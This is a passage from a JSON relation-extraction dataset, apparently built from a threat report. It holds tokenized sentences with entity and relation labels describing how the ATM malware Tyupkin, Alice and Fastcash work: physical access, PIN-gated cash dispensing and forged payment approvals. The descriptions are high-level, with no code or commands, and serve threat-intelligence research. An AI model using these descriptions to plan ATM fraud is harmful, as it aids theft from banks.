[125, 125], "name": "attackers", "pos": [4, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [140, 140], "name": "Alice", "pos": [6, 7], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [146, 146], "name": "PIN", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [154, 154], "name": "Alice", "pos": [6, 7], "index": "12_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [158, 158], "name": "dispenser module", "pos": [10, 12], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "ST", "evidence": [1, 2, 3], "t": 2, "h": 4}, {"r": "RF", "evidence": [1, 2, 3], "t": 2, "h": 4}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "UK", "evidence": [3], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "t": 8, "h": 9}, {"r": "CO", "evidence": [5, 6], "h": 8, "t": 10}, {"r": "EX", "evidence": [6], "t": 10, "h": 11}, {"r": "RD", "evidence": [7], "h": 12, "t": 13}]}, {"title": "651-8", "sents": [["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."], ["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."], ["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."], ["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."], ["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."], ["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."], ["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."], ["Main", "Alice", "UI", "window", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [23, 23], "name": "ports", "pos": [23, 24], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "malware", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "Tyupkin", "pos": [4, 5], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [55, 55], "name": "network connections", "pos": [7, 9], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [66, 66], "name": "ATM", "pos": [18, 19], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "Tyupkin", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [87, 87], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "attackers", "pos": [4, 5], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "Alice", "pos": [6, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [112, 112], "name": "PIN", "pos": [12, 13], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [120, 120], "name": "Alice", "pos": [6, 7], "index": "11_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [124, 124], "name": "dispenser module", "pos": [10, 12], "index": "12_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "ST", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "RF", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "UK", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 3, "t": 5}, {"r": "FR", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "t": 7, "h": 8}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 9}, {"r": "EX", "evidence": [5], "t": 9, "h": 10}, {"r": "RD", "evidence": [6], "h": 11, "t": 12}]}, {"title": "651-9", "sents": [["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."], ["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."], ["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."], ["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."], ["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."], ["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."], ["Main", "Alice", "UI", "window", "."], ["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "malware", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "Tyupkin", "pos": [4, 5], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [28, 28], "name": "network connections", "pos": [7, 9], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [39, 39], "name": "ATM", "pos": [18, 19], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "Tyupkin", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "attackers", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [79, 79], "name": "Alice", "pos": [6, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "PIN", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [93, 93], "name": "Alice", "pos": [6, 7], "index": "9_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [97, 97], "name": "dispenser module", "pos": [10, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [112, 112], "name": "Fastcash", "pos": [0, 1], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [116, 116], "name": "process injector", "pos": [4, 6], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [119, 119], "name": "shared objects", "pos": [7, 9], "index": "13_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [129, 129], "name": "bank", "pos": [17, 18], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "UK", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 1, "t": 3}, {"r": "FR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "t": 5, "h": 6}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "EX", "evidence": [4], "t": 7, "h": 8}, {"r": "RD", "evidence": [5], "h": 9, "t": 10}, {"r": "IJ", "evidence": [7], "h": 13, "t": 14}, {"r": "CO", "evidence": [7], "h": 11, "t": 13}, {"r": "CO", "evidence": [7], "h": 11, "t": 12}]}, {"title": "651-10", "sents": [["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."], ["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."], ["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."], ["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."], ["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."], ["Main", "Alice", "UI", "window", "."], ["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."], ["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "Tyupkin", "pos": [4, 5], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [7, 7], "name": "network connections", "pos": [7, 9], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "ATM", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "Tyupkin", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "attackers", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "Alice", "pos": [6, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "PIN", "pos": [12, 13], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [72, 72], "name": "Alice", "pos": [6, 7], "index": "8_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [76, 76], "name": "dispenser module", "pos": [10, 12], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [91, 91], "name": "Fastcash", "pos": [0, 1], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [95, 95], "name": "process injector", "pos": [4, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [98, 98], "name": "shared objects", "pos": [7, 9], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [108, 108], "name": "bank", "pos": [17, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [114, 114], "name": "malware", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [119, 119], "name": "code", "pos": [6, 7], "index": "15_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [128, 128], "name": "ISO8583 packets", "pos": [15, 17], "index": "16_0"}]], "labels": [{"r": "UK", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "t": 4, "h": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "EX", "evidence": [3], "t": 6, "h": 7}, {"r": "RD", "evidence": [4], "h": 8, "t": 9}, {"r": "IJ", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6], "h": 10, "t": 12}, {"r": "CO", "evidence": [6], "h": 10, "t": 11}, {"r": "CO", "evidence": [6, 7], "h": 10, "t": 14}, {"r": "EX", "evidence": [7], "h": 14, "t": 15}, {"r": "RD", "evidence": [7], "h": 14, "t": 16}]}, {"title": "651-11", "sents": [["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."], ["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."], ["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."], ["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."], ["Main", "Alice", "UI", "window", "."], ["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."], ["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."], ["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "Tyupkin", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "It", "pos": [0, 1], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "attackers", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [32, 32], "name": "Alice", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "PIN", "pos": [12, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [46, 46], "name": "Alice", "pos": [6, 7], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [50, 50], "name": "dispenser module", "pos": [10, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [65, 65], "name": "Fastcash", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [69, 69], "name": "process injector", "pos": [4, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [72, 72], "name": "shared objects", "pos": [7, 9], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [82, 82], "name": "bank", "pos": [17, 18], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [88, 88], "name": "malware", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [93, 93], "name": "code", "pos": [6, 7], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [102, 102], "name": "ISO8583 packets", "pos": [15, 17], "index": "13_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [107, 107], "name": "ATM", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [111, 111], "name": "attackers", "pos": [6, 7], "index": "15_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [138, 138], "name": "ATM", "pos": [33, 34], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [141, 141], "name": "attackers", "pos": [36, 37], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [1], "t": 1, "h": 2}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "EX", "evidence": [2], "t": 3, "h": 4}, {"r": "RD", "evidence": [3], "h": 5, "t": 6}, {"r": "IJ", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [5], "h": 7, "t": 9}, {"r": "CO", "evidence": [5], "h": 7, "t": 8}, {"r": "CO", "evidence": [5, 6], "h": 7, "t": 11}, {"r": "CO", "evidence": [5, 6, 7], "h": 7, "t": 17}, {"r": "CO", "evidence": [5, 6, 7], "h": 7, "t": 15}, {"r": "EX", "evidence": [6], "h": 11, "t": 12}, {"r": "RD", "evidence": [6], "h": 11, "t": 13}, {"r": "RD", "evidence": [6, 7], "t": 13, "h": 14}, {"r": "RD", "evidence": [6, 7], "t": 13, "h": 14}, {"r": "WR", "evidence": [6, 7], "t": 13, "h": 14}, {"r": "CO", "evidence": [7], "h": 14, "t": 16}]}, {"title": "651-12", "sents": [["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."], ["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."], ["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."], ["Main", "Alice", "UI", "window", "."], ["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."], ["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."], ["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."], ["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "attackers", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "Alice", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "PIN", "pos": [12, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [33, 33], "name": "Alice", "pos": [6, 7], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [37, 37], "name": "dispenser module", "pos": [10, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [52, 52], "name": "Fastcash", "pos": [0, 1], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [56, 56], "name": "process injector", "pos": [4, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [59, 59], "name": "shared objects", "pos": [7, 9], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [69, 69], "name": "bank", "pos": [17, 18], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [75, 75], "name": "malware", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [80, 80], "name": "code", "pos": [6, 7], "index": "11_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [89, 89], "name": "ISO8583 packets", "pos": [15, 17], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [94, 94], "name": "ATM", "pos": [2, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [98, 98], "name": "attackers", "pos": [6, 7], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [125, 125], "name": "ATM", "pos": [33, 34], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [128, 128], "name": "attackers", "pos": [36, 37], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [144, 144], "name": "malware", "pos": [11, 12], "index": "17_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [156, 156], "name": "responses", "pos": [23, 24], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "IJ", "evidence": [4], "h": 8, "t": 9}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 6, "t": 18}, {"r": "CO", "evidence": [4], "h": 6, "t": 8}, {"r": "CO", "evidence": [4], "h": 6, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 6, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "h": 6, "t": 14}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 6, "t": 17}, {"r": "EX", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [5], "h": 10, "t": 12}, {"r": "RD", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "RD", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "WR", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "RD", "evidence": [6, 7], "h": 13, "t": 18}, {"r": "RD", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "WR", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "CO", "evidence": [6], "h": 13, "t": 15}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}]}, {"title": "651-13", "sents": [["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."], ["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."], ["Main", "Alice", "UI", "window", "."], ["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."], ["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."], ["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."], ["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."], ["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "Alice", "pos": [6, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "PIN", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "Alice", "pos": [6, 7], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [24, 24], "name": "dispenser module", "pos": [10, 12], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [39, 39], "name": "Fastcash", "pos": [0, 1], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [43, 43], "name": "process injector", "pos": [4, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [46, 46], "name": "shared objects", "pos": [7, 9], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [56, 56], "name": "bank", "pos": [17, 18], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [62, 62], "name": "malware", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [67, 67], "name": "code", "pos": [6, 7], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [76, 76], "name": "ISO8583 packets", "pos": [15, 17], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [81, 81], "name": "ATM", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [85, 85], "name": "attackers", "pos": [6, 7], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [112, 112], "name": "ATM", "pos": [33, 34], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [115, 115], "name": "attackers", "pos": [36, 37], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [131, 131], "name": "malware", "pos": [11, 12], "index": "15_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [143, 143], "name": "responses", "pos": [23, 24], "index": "16_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [167, 167], "name": "list", "pos": [2, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [180, 180], "name": "malware", "pos": [15, 16], "index": "18_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "IJ", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 4, "t": 16}, {"r": "CO", "evidence": [3], "h": 4, "t": 6}, {"r": "CO", "evidence": [3], "h": 4, "t": 5}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 8}, {"r": "CO", "evidence": [3, 4, 5], "h": 4, "t": 14}, {"r": "CO", "evidence": [3, 4, 5], "h": 4, "t": 12}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 4, "t": 15}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "RD", "evidence": [4], "h": 8, "t": 10}, {"r": "RD", "evidence": [4, 5], "t": 10, "h": 11}, {"r": "RD", "evidence": [4, 5], "t": 10, "h": 11}, {"r": "WR", "evidence": [4, 5], "t": 10, "h": 11}, {"r": "RD", "evidence": [5, 6], "h": 11, "t": 16}, {"r": "RD", "evidence": [5, 6], "h": 13, "t": 16}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 16}, {"r": "CO", "evidence": [5], "h": 11, "t": 13}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "UK", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "CO", "evidence": [6, 7], "h": 16, "t": 17}]}, {"title": "651-14", "sents": [["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."], ["Main", "Alice", "UI", "window", "."], ["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."], ["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."], ["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."], ["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."], ["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."], ["In", "our", "case", ",", "the", "clustering", "was", "conducted", "by", "extracting", "the", "following", "attributes", "of", "each", "sample", ":", "Strings", "extracted", "from", "the", "fileDisassembled", "code", "from", "the", "entry", "point", "of", "the", "fileFile", "entropy", "and", "the", "presence", "of", "a", "known", "packerImported", "or", "exported", "functionsEmbedded", "resourcesAfter", "collecting", "the", "attributes", "from", "each", "sample", ",", "Jaccard", "distance", "is", "calculated", "for", "every", "pair", "of", "the", "files", "in", "the", "set", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "Alice", "pos": [6, 7], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [10, 10], "name": "dispenser module", "pos": [10, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [25, 25], "name": "Fastcash", "pos": [0, 1], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "process injector", "pos": [4, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "shared objects", "pos": [7, 9], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [42, 42], "name": "bank", "pos": [17, 18], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [48, 48], "name": "malware", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [53, 53], "name": "code", "pos": [6, 7], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [62, 62], "name": "ISO8583 packets", "pos": [15, 17], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [67, 67], "name": "ATM", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [71, 71], "name": "attackers", "pos": [6, 7], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [98, 98], "name": "ATM", "pos": [33, 34], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [101, 101], "name": "attackers", "pos": [36, 37], "index": "12_0"}], [{"type": "MP", "sent_id": 5, 